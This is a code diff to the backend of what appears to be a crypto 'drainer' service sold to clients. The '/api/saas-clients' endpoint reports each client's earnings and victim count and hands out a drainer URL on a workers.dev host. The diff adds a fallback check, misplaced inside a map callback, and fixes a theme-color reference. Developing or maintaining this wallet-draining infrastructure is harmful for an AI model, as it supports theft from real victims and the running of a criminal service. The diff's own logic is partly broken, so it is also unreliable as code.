@@ -1825,6 +1825,9 @@ app.get("/api/history", (req, res) => {
 app.get("/api/saas-clients", (req, res) => {
   try {
     const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
+  if (!clients || !clientEarnings || !clientVictims) {
+    return res.json({ success: true, totalClients: 0, clients: [] });
+  }
       const earnings = clientEarnings.get(clientId) || [];
       const totalEarnings = earnings.reduce((sum, e) => sum + (parseFloat(e.amount) || 0), 0);
       const victimCount = (clientVictims.get(clientId) || []).length;
@@ -1838,7 +1841,7 @@ app.get("/api/saas-clients", (req, res) => {
         victimCount,
         registrationDate: "Recent",
         drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
-        dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`
+        dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${client.themeColor}`
       };
     });
     
